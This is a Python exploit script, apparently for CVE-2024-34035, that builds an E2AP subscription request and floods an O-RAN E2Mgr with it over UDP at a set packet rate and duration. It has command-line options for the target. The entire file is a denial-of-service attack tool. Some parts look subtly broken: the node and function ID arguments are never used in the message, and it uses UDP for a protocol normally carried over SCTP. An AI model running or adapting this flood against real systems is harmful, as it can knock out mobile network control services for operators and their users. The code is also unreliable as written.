#!/usr/bin/env python3

import sys
import socket
import time
import argparse
from pycrate_asn1dir import E2AP
from pycrate_asn1rt.utils import *

def create_malicious_subscription(e2_node_id, ran_func_id):
    """Create E2AP Subscription Request with minimal valid structure"""
    return E2AP.E2AP_PDU_Descriptions.InitiatingMessage(
        procedureCode=E2AP.ProcedureCode_id_subscription,
        criticality=E2AP.Criticality_reject,
        value=E2AP.SubscriptionRequest(
            requestId=1,
            eventTriggerDefinition=b"\x00",  # Minimal payload
            actionDefinitions=E2AP.ActionDefinitionsList([
                E2AP.ActionDefinition(
                    ricActionId=1,
                    ricActionType=E2AP.RICactionType_report,
                    ricActionDefinition=b""
                )
            ])
        )
    )

def flood_e2mgr(target_ip, target_port, e2_node_id, ran_func_id, rate, duration):
    """Flood E2Mgr with subscription requests"""
    subs_request = create_malicious_subscription(e2_node_id, ran_func_id)
    encoded_msg = subs_request.to_aper()
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    start_time = time.time()
    packet_count = 0
    
    print(f"[+] Starting flood attack to {target_ip}:{target_port}")
    print(f"[+] Parameters: {rate} pps for {duration} seconds")
    
    try:
        while (time.time() - start_time) < duration:
            burst_start = time.time()
            for _ in range(rate):
                sock.sendto(encoded_msg, (target_ip, target_port))
                packet_count += 1
                
                # Print progress every 1000 packets
                if packet_count % 1000 == 0:
                    elapsed = time.time() - start_time
                    print(f"\r[>] Sent {packet_count} packets ({packet_count/elapsed:.2f} pps)", end="")
                
            # Rate limiting
            time.sleep(max(0, 1 - (time.time() - burst_start)))
            
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    finally:
        sock.close()
        elapsed = time.time() - start_time
        print(f"\n[+] Attack completed")
        print(f"    Total packets sent: {packet_count}")
        print(f"    Average rate: {packet_count/elapsed:.2f} pps")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="E2Mgr Subscription Flood Exploit (CVE-2024-34035)")
    parser.add_argument("target_ip", help="IP address of vulnerable E2Mgr")
    parser.add_argument("-p", "--port", type=int, default=36422, help="E2AP port (default: 36422)")
    parser.add_argument("-n", "--e2-node-id", default="gnbd_001_001_00019b_0", 
                      help="E2 Node ID (default: gnbd_001_001_00019b_0)")
    parser.add_argument("-f", "--ran-function-id", type=int, default=2,
                      help="RAN Function ID (default: 2)")
    parser.add_argument("-r", "--rate", type=int, default=500,
                      help="Packets per second (default: 500)")
    parser.add_argument("-d", "--duration", type=int, default=60,
                      help="Attack duration in seconds (default: 60)")

    args = parser.parse_args()

    try:
        flood_e2mgr(
            args.target_ip,
            args.port,
            args.e2_node_id,
            args.ran_function_id,
            args.rate,
            args.duration
        )
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        sys.exit(1)
